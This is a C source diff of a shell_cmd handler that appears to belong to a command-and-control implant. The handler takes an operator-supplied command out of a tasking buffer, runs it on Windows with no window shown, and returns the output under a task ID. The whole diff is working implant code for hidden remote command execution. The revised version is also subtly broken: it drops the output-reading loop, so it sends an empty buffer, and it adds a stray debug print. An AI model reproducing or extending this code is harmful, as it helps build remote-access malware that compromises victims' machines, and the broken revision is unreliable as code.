@@ -3,81 +3,60 @@
 #include <stdio.h>
 
 void shell_cmd(int taskId, int argc, struct TLVBuild * tlv) {
-  if (argc < 1) return;
+  printf("[aaaaaaaa] %u", argc);
 
+  if (argc < 1) return;
   struct TLVBuild out;
   out.buf = malloc(50);
+  out.read_cursor = 0;
   out.allocsize = 50;
   out.bufsize = 0;
 
   int cmdSize = extractInt32(tlv);
   char * cmd = malloc(cmdSize + 1);
-
   extractBytes(tlv, cmdSize, cmd);
   cmd[cmdSize] = 0x00;
-
   printf("[cmd] executing: %s\n", cmd);
 
-  SECURITY_ATTRIBUTES secAttrs = { sizeof(SECURITY_ATTRIBUTES), NULL, TRUE };
-  
-  HANDLE inRead;
-  HANDLE inWrite;
-  HANDLE outRead;
-  HANDLE outWrite;
+  HANDLE  hStdInPipeRead   = NULL;
+  HANDLE  hStdInPipeWrite  = NULL;
+  HANDLE  hStdOutPipeRead  = NULL;
+  HANDLE  hStdOutPipeWrite = NULL;
 
-  if (!CreatePipe(&inRead, &inWrite, &secAttrs, 0)) {
-    printf("err: couldnt create in pipe\n;"); return;
-  }
-  if (!CreatePipe(&outRead, &outWrite, &secAttrs, 0)) {
-    printf("err: couldnt create out pipe\n;"); return;
-  }
+  PROCESS_INFORMATION ProcessInfo     = { };
+  SECURITY_ATTRIBUTES SecurityAttr    = { sizeof( SECURITY_ATTRIBUTES ), NULL, TRUE };
+  STARTUPINFOA        StartUpInfoA    = { };
 
-  STARTUPINFOA startInfo;
-
-  startInfo.cb = sizeof(STARTUPINFOA);
-  startInfo.dwFlags = STARTF_USESTDHANDLES;
-  startInfo.hStdError = outWrite;
-  startInfo.hStdInput = outWrite;
-
-  PROCESS_INFORMATION processInfo;
-
-  if(!CreateProcessA(
-    NULL, cmd, &secAttrs, NULL, TRUE, 
-    CREATE_NO_WINDOW, NULL, NULL, 
-    &startInfo, &processInfo
-  )) {
-    printf("err: couldnt create process\n;"); return;
+  if ( CreatePipe( &hStdInPipeRead, &hStdInPipeWrite, &SecurityAttr, 0 ) == FALSE )
+  {
+    return;
   }
 
-  char * outBuffer = malloc(1);
-  char * filePart = malloc(1024);
-  
-  DWORD bufferSize = 0;
-  DWORD dwRead = 0;
-  
-  printf("while loop!\n");
-    
-  CloseHandle(outWrite);
-  CloseHandle(inRead);
-  
-  while (ReadFile(outRead, filePart, 1024, &dwRead, NULL)) {
-    printf("read: %u bytes\n", dwRead);
-    if (dwRead == 0) break;
-    outBuffer = realloc(outBuffer, bufferSize + dwRead);
-    bufferSize += dwRead;
-    memcpy(outBuffer + bufferSize - dwRead, filePart, dwRead);
+  if ( CreatePipe( &hStdOutPipeRead, &hStdOutPipeWrite, &SecurityAttr, 0 ) == FALSE )
+  {
+    return;
   }
 
-  printf("finally read: %u bytes\n", bufferSize);
+  StartUpInfoA.cb         = sizeof( STARTUPINFOA );
+  StartUpInfoA.dwFlags    = STARTF_USESTDHANDLES;
+  StartUpInfoA.hStdError  = hStdOutPipeWrite;
+  StartUpInfoA.hStdOutput = hStdOutPipeWrite;
+  StartUpInfoA.hStdInput  = hStdInPipeRead;
 
-  addBytes(&out, bufferSize, outBuffer);
+  if ( CreateProcessA( NULL, cmd, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &StartUpInfoA, &ProcessInfo ) == FALSE )
+  {
+      return;
+  }
+
+  CloseHandle( hStdOutPipeWrite );
+  CloseHandle( hStdInPipeRead );
+
   send_output(taskId, "output", "", out.bufsize, out.buf);
-  
-  CloseHandle(outRead);
-  CloseHandle(inWrite);
 
-  free(outBuffer);
-  free(filePart);
+  CloseHandle( hStdOutPipeRead );
+  CloseHandle( hStdInPipeWrite );
+
+
   free(cmd);
   free(out.buf);
 }
